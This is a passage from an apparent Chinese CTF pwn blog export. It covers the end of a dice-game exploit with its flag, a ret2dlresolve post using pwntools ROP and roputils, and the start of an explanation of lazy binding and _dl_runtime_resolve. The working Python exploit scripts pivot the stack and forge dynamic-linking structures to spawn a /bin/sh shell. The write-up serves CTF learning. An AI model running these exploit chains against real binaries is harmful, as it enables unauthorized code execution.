<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-python"><code class="language-python">You win<span class="token punctuation">.</span>Game <span class="token number">50</span><span class="token operator">/</span><span class="token number">50</span>Give me the point<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">~</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span> You win<span class="token punctuation">.</span>Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPcyberpeace<span class="token punctuation">{</span><span class="token number">3c15b24b5df0e56ae8d362d6a0f9c8dc</span><span class="token punctuation">}</span>Bye bye!<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dlresovle And Roputils</title>
      <link href="/2020/08/18/ret2dlresovle-and-roputils/"/>
      <url>/2020/08/18/ret2dlresovle-and-roputils/</url>
      
        <content type="html"><![CDATA[<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ssize_t <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可利用函数就差不多就只有read，无后门</p><h3 id="gdb-gt-溢出点为44"><a href="#gdb-gt-溢出点为44" class="headerlink" title="gdb==&gt;溢出点为44"></a>gdb==&gt;溢出点为44</h3><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf/test4$ checksec 0pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test4/0pwn'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>hunter@hunter:~/PWN/Freebuf/test4$ </code></pre><h2 id="EXP（栈迁移）"><a href="#EXP（栈迁移）" class="headerlink" title="EXP（栈迁移）"></a>EXP（栈迁移）</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./0pwn'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'0pwn'</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> <span class="token number">0x600</span>alarm_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>rel_plt_addr <span class="token operator">=</span> <span class="token number">0x804833c</span>dynsym_addr <span class="token operator">=</span> <span class="token number">0x80481dc</span>dynstr_addr <span class="token operator">=</span> <span class="token number">0x804827c</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>这一部分可以完成栈迁移，rop.migrate(base_stage)迁移至base_stage处</p><h3 id="pwntools-rop模块"><a href="#pwntools-rop模块" class="headerlink" title="pwntools rop模块"></a>pwntools rop模块</h3><blockquote><p>先简单回顾一下ROP的原理，由于NX开启不能在栈上执行shellcode，我们可以在栈上布置一系列的返回地址与参数，这样可以进行多次的函数调用，通过函数尾部的ret语句控制程序的流程，而用程序中的一些pop/ret的代码块(称之为gadget)来平衡堆栈。其完成的事情无非就是放上/bin/sh，覆盖程序中某个函数的GOT为system的，然后ret到那个函数的plt就可以触发system(‘/bin/sh’)。由于是利用ret指令的exploit，所以叫Return-Oriented Programming。（如果没有开启ASLR，可以直接使用ret2libc技术）<br>好，这样来看，这种技术的难点自然就是如何在栈上布置返回地址以及函数参数了。而ROP模块的作用，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。</p></blockquote><p>+call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)<br>+chain() : 返回当前的字节序列，即payload<br>+dump() : 直观地展示出当前的rop chain<br>+raw() : 在rop chain中加上一个整数或字符串<br>+search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget<br>+unresolve(value) : 给出一个地址，反解析出符号<br>+rop.migrate(addr):栈迁移到addr</p><p>设置rop chain对象 此处为0pwn程序。设置完后rop里面是空的（相当于payload）</p><pre class=" language-JavaScript"><code class="language-JavaScript">In [2]: elf = ELF('0pwn')[*] '/home/hunter/PWN/Freebuf/test4/0pwn'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)In [3]: rop = ROP(elf)[*] Loaded cached gadgets for '0pwn'</code></pre><p>rop.raw()</p><pre class=" language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">60</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rop<span class="token punctuation">.</span>chainOut<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>bound method ROP<span class="token punctuation">.</span>chain of ROP<span class="token punctuation">(</span><span class="token punctuation">[</span>ELF<span class="token punctuation">(</span><span class="token string">'/home/hunter/PWN/Freebuf/test4/0pwn'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span>In <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span>In <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">:</span> len<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">60</span>In <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">:</span> </code></pre><p>rop.migrate(addr)</p><pre class=" language-pyton"><code class="language-pyton">rop.raw('A'*44)rop.read(0,base_stage,100)  #调用完read后，用migrate进行栈迁移rop.migrate(base_stage)  </code></pre><h2 id="EXP-伪造）"><a href="#EXP-伪造）" class="headerlink" title="EXP(伪造）"></a>EXP(伪造）</h2><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt0 <span class="token operator">=</span> <span class="token number">0x8048380</span>index_off <span class="token operator">=</span> base_stage <span class="token operator">+</span><span class="token number">28</span> <span class="token operator">-</span> rel_plt_addrfake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span>align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span>fake_dynsym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span>fake_dynsym_addr <span class="token operator">+=</span> alignr_off <span class="token operator">=</span> <span class="token punctuation">(</span>fake_dynsym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span>r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_off <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>st_name <span class="token operator">=</span> fake_dynsym_addr<span class="token operator">+</span><span class="token number">16</span> <span class="token operator">-</span> dynstr_addrfake_dynsym_tab <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>fake_reloc_tab <span class="token operator">=</span> p32<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_off<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'BBBB'</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">82</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_reloc_tab<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span>align<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_dynsym_tab<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'system\x00'</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">82</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="align"><a href="#align" class="headerlink" title="align"></a>align</h3><p>align的作用是帮fake_dynsym_addr进行对齐，我们仔细说说：</p><p>假设内存布局是这样的  </p><pre class=" language-Assembly"><code class="language-Assembly">如果fake_dynsym_addr直接等于base_stage+36。base_stage+36可以是下面的任何一个位置0x8048a00 11111111 22222222 33333333 44444444   dynsym起始位置0x8048a10 11111111 22222222 33333333 44444444   如果base_stage+36是0x8048a18（33333333）那么就不符合结构体对dynsym的单表16字节大小的设定，所以fake_dynsym_addr0x8048a20 11111111 22222222 33333333 44444444   只能是开头地址0x8048a30 11111111 22222222 33333333 444444440x8048a40 11111111 22222222 33333333 444444440x8048a50 11111111 22222222 33333333 444444440x8048a60 11111111 22222222 33333333 444444440x8048a70 11111111 22222222 33333333 444444440x8048a80 11111111 22222222 33333333 44444444</code></pre><p>得到开头地址的计算方法为：align=0x10 - (fake_dynsym_addr - dynsym_addr)&amp;0xf  ，比如这个例子：fake_dynsym_addr==0x8048a18  ，dynsym_addr==0x8048a00  ==&gt;&gt; align=0x8</p><pre class=" language-Assembly"><code class="language-Assembly">>>> 0x10 - ((0x8048a88 - 0x8048a00) & 0xf) 8</code></pre><p>fake_dynsym_addr += align ==&gt;&gt; 0x8048a18 + 0x8 == 0x8048a20 处于开头位置</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre class=" language-JavaScript"><code class="language-JavaScript">[*] Switching to interactive mode[DEBUG] Received 0x1a bytes:    '/bin/sh: 1: aa: not found\n'/bin/sh: 1: aa: not found$ ls[DEBUG] Sent 0x3 bytes:    'ls\n'[DEBUG] Received 0x7c bytes:    '0pwn\t exp2.py\t\tpeda-session-dash.txt\n'    '0pwn.py  exp.py\t\t\tpeda-session-ls.txt\n'    'core\t peda-session-0pwn.txt\tpeda-session-pwn.txt\n'0pwn     exp2.py        peda-session-dash.txt0pwn.py  exp.py            peda-session-ls.txtcore     peda-session-0pwn.txt    peda-session-pwn.txt[*] Got EOF while reading in interactive$  </code></pre><p>这个aa的出现是因为pwntools自带对齐字符串，补a（具体怎么补我也不是很清楚）</p><p>小结<br>这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，可以直接复制黏贴中间部分拿去打别的题目</p><h2 id="Roputils"><a href="#Roputils" class="headerlink" title="Roputils"></a>Roputils</h2><p>从上面攻击脚本我们不难看出来，虽然构造payload的过程很繁琐，但是实际上大部分代码的格式都是固定的，完全可以自己把它们封装成一个函数进行调用，Roputils工具就是用来干这个的。<br>这个工具功能挺强大的但是，没有文档说明我就学了点针对ret2dl-resolve的代码。<br>详情见：<a href="https://github.com/inaz2/roputils" target="_blank" rel="noopener">https://github.com/inaz2/roputils</a></p><p>拿上面那个题为例子：把roputils.py和pwn题放在同一个文件夹下（我不会把它导入python模块）来使用</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROP</span><span class="token keyword">from</span> roputils <span class="token keyword">import</span><span class="token operator">*</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./0pwn'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#ROP继承了ELF类，下面的section, got, plt都是调用父类的</span>bss_addr <span class="token operator">=</span> rop<span class="token punctuation">.</span>section<span class="token punctuation">(</span><span class="token string">'.bss'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#获取bss地址</span>read_got <span class="token operator">=</span> rop<span class="token punctuation">.</span>got<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#获取read_got地址</span>read_plt <span class="token operator">=</span> rop<span class="token punctuation">.</span>plt<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#获取read_plt地址</span>offset <span class="token operator">=</span> <span class="token number">44</span>  <span class="token comment" spellcheck="true">#溢出点</span>sh <span class="token operator">=</span> Proc<span class="token punctuation">(</span><span class="token string">'./0pwn'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#Proc(host='111.11.1.1',port=10000) 相当于remote</span>buf <span class="token operator">=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#fill生成pad</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span>read_plt<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#call：利用上面获得的read plt地址再次调用</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_call<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数（system)的参数。</span>                                                    <span class="token comment" spellcheck="true">#这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处</span>sh<span class="token punctuation">.</span>write<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#数据发送</span>buf <span class="token operator">=</span> rop<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#此时buf == '/bin/sh\x00'</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#fill第二个参数被指定，就是将其填充至指定长度</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_data<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">##dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充buf</span>sh<span class="token punctuation">.</span>write<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interact<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#设置为0即可</span></code></pre><p>结果:</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf/test4$ python 0pwn_1.pygot a shell<span class="token operator">!</span><span class="token function">ls</span>0pwn0pwn_1.py0pwn.pycoreexp2.pyexp.pypeda-session-0pwn.txtpeda-session-dash.txtpeda-session-ls.txtpeda-session-pwn.txtroputils.pyroputils.pyc</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dlresolve原理理解</title>
      <link href="/2020/08/17/ret2dlresolve/"/>
      <url>/2020/08/17/ret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h2 id="延迟绑定技术"><a href="#延迟绑定技术" class="headerlink" title="延迟绑定技术"></a>延迟绑定技术</h2><p><strong>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程</strong></p><p>适用于绕过NX和ASLR保护</p><h2 id="探究延迟绑定技术"><a href="#探究延迟绑定技术" class="headerlink" title="探究延迟绑定技术"></a>探究延迟绑定技术</h2><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-c"><code class="language-c">include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token comment" spellcheck="true">// gcc -m32 -fno-stack-protector -no-pie test1.c -o test1</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在开始前对print read函数，查看地址：</p><pre class=" language-bash"><code class="language-bash">Reading symbols from test1<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.gdb-peda$ p <span class="token function">read</span><span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">></span><span class="token punctuation">}</span> 0x80482e0 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>gdb-peda$ </code></pre><p>查看read的plt表的内容：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/3i 0x80482e0   0x80482e0 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>:        jmp    DWORD PTR ds:0x804a00c   0x80482e6 <span class="token operator">&lt;</span>read@plt+6<span class="token operator">></span>:    push   0x0   0x80482eb <span class="token operator">&lt;</span>read@plt+11<span class="token operator">></span>:    jmp    0x80482d0</code></pre><p>可知先会跳到0x804a00c处（read的got表）</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/wx 0x0804a00c0x804a00c:    0x080482e6gdb-peda$ 所以此时read的got表中存储了read@plt的下一条地址0x80482e6 <span class="token operator">&lt;</span>read@plt+6<span class="token operator">></span>:    push   0x0</code></pre><p><strong>因此将会把0压入栈中</strong>，并跳转到0x80482d0地址执行</p><p>0x80482d0为plt表的起始地址，称为plt0，其指令为：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/3i 0x80482d0   0x80482d0:    push   DWORD PTR ds:0x804a004   0x80482d6:    jmp    DWORD PTR ds:0x804a008</code></pre><p>可以看到这两条指令将got+4（0x804a004）里面的值压入栈中，然后跳转到got+8（0x804a008）的地方去执行。跟进got+8：（0x804a004存放linkmap）</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/wx 0x804a0080x804a008:    0xf7fead90gdb-peda$ 这里存的就是大名鼎鼎的_dl_runtime_resolve函数的地址0xf7fead90</code></pre><p>可以看到程序进入到了_dl_runtime_resolve，因此got+8的地方存储的是_dl_runtime_resolve函数的地址。看_dl_runtime_resolve的源码，源码在/sysdeps/i386/dl-trampoline.S中：</p><pre class=" language-bash"><code class="language-bash">0xf7feed90 <span class="token operator">&lt;</span>_dl_runtime_resolve<span class="token operator">></span>       push   eax0xf7feed91 <span class="token operator">&lt;</span>_dl_runtime_resolve+1<span class="token operator">></span>     push   ecx0xf7feed92 <span class="token operator">&lt;</span>_dl_runtime_resolve+2<span class="token operator">></span>     push   edx0xf7feed93 <span class="token operator">&lt;</span>_dl_runtime_resolve+3<span class="token operator">></span>     mov    edx, dword ptr <span class="token punctuation">[</span>esp + 0x10<span class="token punctuation">]</span>0xf7feed97 <span class="token operator">&lt;</span>_dl_runtime_resolve+7<span class="token operator">></span>     mov    eax, dword ptr <span class="token punctuation">[</span>esp + 0xc<span class="token punctuation">]</span>0xf7feed9b <span class="token operator">&lt;</span>_dl_runtime_resolve+11<span class="token operator">></span>    call   _dl_fixup <span class="token operator">&lt;</span>0xf7fe85a0<span class="token operator">></span>注意这个 _dl_fixup 函数的调用</code></pre><blockquote><p>dl_runtime_resolve在源码中是用汇编实现的只是压栈并调用_dl_fixup，在跟进去_dl_fixup前，先给出一些与动态链接相关的数据结构。<br>根据《程序员的自我修养》中的描述：动态链接中最重要的结构应该是dynamic段，这个段里面保存了动态链接器所需要的基本信息。比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。<br>我们来查看一下dynamic：</p></blockquote><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -d test1Dynamic section at offset 0xf14 contains 24 entries:  标记        类型                         名称/值 0x00000001 <span class="token punctuation">(</span>NEEDED<span class="token punctuation">)</span>                     共享库：<span class="token punctuation">[</span>libc.so.6<span class="token punctuation">]</span> 0x0000000c <span class="token punctuation">(</span>INIT<span class="token punctuation">)</span>                       0x80482a8 0x0000000d <span class="token punctuation">(</span>FINI<span class="token punctuation">)</span>                       0x80484d4 0x00000019 <span class="token punctuation">(</span>INIT_ARRAY<span class="token punctuation">)</span>                 0x8049f0c 0x0000001b <span class="token punctuation">(</span>INIT_ARRAYSZ<span class="token punctuation">)</span>               4 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x0000001a <span class="token punctuation">(</span>FINI_ARRAY<span class="token punctuation">)</span>                 0x8049f10 0x0000001c <span class="token punctuation">(</span>FINI_ARRAYSZ<span class="token punctuation">)</span>               4 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x6ffffef5 <span class="token punctuation">(</span>GNU_HASH<span class="token punctuation">)</span>                   0x80481ac 0x00000005 <span class="token punctuation">(</span>STRTAB<span class="token punctuation">)</span>    动态链接符号表    0x804821c 0x00000006 <span class="token punctuation">(</span>SYMTAB<span class="token punctuation">)</span>    动态链接字符串    0x80481cc 0x0000000a <span class="token punctuation">(</span>STRSZ<span class="token punctuation">)</span>                      74 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x0000000b <span class="token punctuation">(</span>SYMENT<span class="token punctuation">)</span>      单个符号表大小  16 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x00000015 <span class="token punctuation">(</span>DEBUG<span class="token punctuation">)</span>                      0x0 0x00000003 <span class="token punctuation">(</span>PLTGOT<span class="token punctuation">)</span>                     0x804a000 0x00000002 <span class="token punctuation">(</span>PLTRELSZ<span class="token punctuation">)</span>                   16 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x00000014 <span class="token punctuation">(</span>PLTREL<span class="token punctuation">)</span>                     REL 0x00000017 <span class="token punctuation">(</span>JMPREL<span class="token punctuation">)</span>      函数重定位表    0x8048298 0x00000011 <span class="token punctuation">(</span>REL<span class="token punctuation">)</span>                        0x8048290 0x00000012 <span class="token punctuation">(</span>RELSZ<span class="token punctuation">)</span>                      8 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x00000013 <span class="token punctuation">(</span>RELENT<span class="token punctuation">)</span>    单个重定位表大小  8 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x6ffffffe <span class="token punctuation">(</span>VERNEED<span class="token punctuation">)</span>                    0x8048270 0x6fffffff <span class="token punctuation">(</span>VERNEEDNUM<span class="token punctuation">)</span>                 1 0x6ffffff0 <span class="token punctuation">(</span>VERSYM<span class="token punctuation">)</span>                     0x8048266 0x00000000 <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span>                       0x0</code></pre><p>他们其实是一个结构体数组，其结构体定义为：</p><pre 